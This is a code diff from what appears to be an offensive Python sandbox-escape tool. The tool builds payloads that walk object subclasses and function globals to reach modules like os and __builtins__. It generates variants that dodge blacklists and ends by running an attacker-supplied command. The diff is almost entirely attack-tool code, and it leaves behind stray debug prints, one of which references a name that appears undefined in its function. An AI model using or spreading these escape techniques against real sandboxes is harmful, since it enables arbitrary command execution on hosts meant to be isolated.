@@ -184,6 +184,8 @@ Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
             logger.warning('[!] Unknown object: %s', tagged_scope[i][0])
     logger.debug('[*] tagged scope: %s', tagged_scope)
     tags = [i[1] for i in tagged_scope.values()]
+    searched_modules = {item: [] for item in useful_modules
+                        if item not in get_module_from_tagged_scope(tagged_scope)}
 
     # Step2: Try to exec directly with simple paths
     simple_path = filter_path_list(RCE_data['directly_getshell'], tagged_scope) if interactive else []
@@ -324,46 +326,35 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
     # Step8: Try inheritance chain
     if 'OBJECT' in tags:
         logger.info('[*] Trying to find inheritance chains.')
-        search = {item: [] for item in useful_modules if item not in get_module_from_tagged_scope(tagged_scope)}
         subclasses = ().__class__.__bases__[0].__subclasses__()
         subclasses_len = len(subclasses)
+        searched_modules_tmp = deepcopy(searched_modules)
         for index, i in enumerate(subclasses):
             progress_bar(index+1, subclasses_len)
             try:
-                for j in search:
+                for j in searched_modules:
                     if j in i.__init__.__globals__:
                         object_path = generated_path['OBJECT']
                         payload = f'{object_path}.__subclasses__()[{index}].__init__.__globals__["{j}"]'
                         for _ in BypassGenerator(payload, allow_unicode_bypass=allow_unicode_bypass, local_scope=tagged_scope).generate_bypasses():
                             if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
-                                search[j].append(_)
+                                searched_modules_tmp[j].append(_)
                                 reminder[_] = f'{index} is the index of {i.__name__}, path to {j} must fit in index of {i.__name__}'
                             continue
             except AttributeError:
                 pass
         print()
         for i in useful_modules:
-            if i not in search:
+            if i not in searched_modules_tmp:
                 # get_name_and_object_from_tag return something like [('os', <module 'os' (built-in)>)]
                 achivements[i] = [get_name_and_object_from_tag('MODULE_'+i.upper(), tagged_scope)[0][0], 1]
-        for k in search:
-            payload = search[k]
+        for k in searched_modules_tmp:
+            payload = searched_modules_tmp[k]
             if not payload:
                 continue
             payload.sort(key=len)
-            payload_len = len(payload)
-            payload = payload[0]
-            output = exec_with_returns(payload, original_scope)
-            if type(output) == ModuleType:
-                tag = f'MODULE_{output.__name__.upper()}'
-            else:
-                tag = 'BUILTINS_SET'
-            useful_modules.remove(k)
-            tagged_scope[payload] = [output, tag]
-            tags.append(tag)
-            generated_path[tag] = payload
-            achivements[k] = [payload, payload_len]
-            logger.info(f'[+] Found inheritance chain: {payload} -> {k}')
+            searched_modules[k].append(payload[0])
+            logger.info(f'[+] Found inheritance chain: {payload[0]} -> {k}')
     else:
         logger.info('[*] No object found, skip inheritance chains.')
 
@@ -383,10 +374,7 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                     result = exec_with_returns(_, original_scope)
                     if not result is None:
                         if result.__name__ == sys.modules[i].__name__:
-                            achivements[i] = [_, 1]
-                            tags.append(f'MODULE_{i.upper()}')
-                            generated_path[f'MODULE_{i.upper()}'] = _
-                            break
+                            searched_modules[i].append(_)
         print()
     if 'LOAD_MODULE' in tags:
         logger.info('[*] try to import modules with LOAD_MODULE path.')
@@ -397,11 +385,10 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                 if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
                     result = exec_with_returns(_, original_scope)
                     if not result is None:
+                        if result.__name__ == 'pty':
+                            print('pty')
                         if result.__name__ == sys.modules[i].__name__:
-                            achivements[i] = [_, 1]
-                            tags.append(f'MODULE_{i.upper()}')
-                            generated_path[f'MODULE_{i.upper()}'] = _
-                            break
+                            searched_modules[i].append(_)
         print()
     if 'MODULES' in tags:
         logger.info('[*] try to import modules with MODULES path.')
@@ -413,11 +400,36 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
                     result = exec_with_returns(_, original_scope)
                     if not result is None:
                         if result.__name__ == sys.modules[i].__name__:
-                            achivements[i] = [_, 1]
-                            tags.append(f'MODULE_{i.upper()}')
-                            generated_path[f'MODULE_{i.upper()}'] = _
-                            break
+                            searched_modules[i].append(_)
         print()
+    
+    # merge searched_modules to tagged_scope
+    for module in searched_modules:
+        payload_list = searched_modules[module]
+        if payload_list:
+            payload_list.sort(key=len)
+            payload_with_reminder = []
+            payload = None
+            for i in payload_list:
+                for j in reminder:
+                    if j in i:
+                        payload_with_reminder.append(i)
+            for i in payload_list:
+                if i not in payload_with_reminder:
+                    payload = i
+            if not payload:
+                payload = payload_with_reminder[0]
+            if module == '__builtins__':
+                tag = 'BUILTINS_SET'
+            else:
+                tag = 'MODULE_'+module.upper()
+            result = exec_with_returns(payload, original_scope)
+            if result:
+                tagged_scope[payload] = [result, tag]
+                tags.append(tag)
+                generated_path[tag] = payload
+                achivements[module] = [payload, len(searched_modules[module])]
+    
     logger.info("[*] modules we have found:")
     logger.info(get_module_from_tagged_scope(tagged_scope))
 
@@ -458,7 +470,7 @@ def bypassRCE(
     DEBUG for more details.
     """
     if cmd == '':
-        logger.warning('[!] command is empty, nothing to execute.')
+        logger.critical('[!] command is empty, nothing to execute.')
         exit(0)
     generated_path = bypassMAIN(local_scope,
                            banned_chr=banned_chr,
@@ -470,7 +482,7 @@ def bypassRCE(
                            interactive=interactive,
                            print_all_payload=print_all_payload,
                            log_level=log_level)
-
+    print(tagged_scope)
     try_to_restore('__import__2RCE', end_of_prog=True, cmd=cmd)
     
     return bypasses_output(generated_path=generated_path)
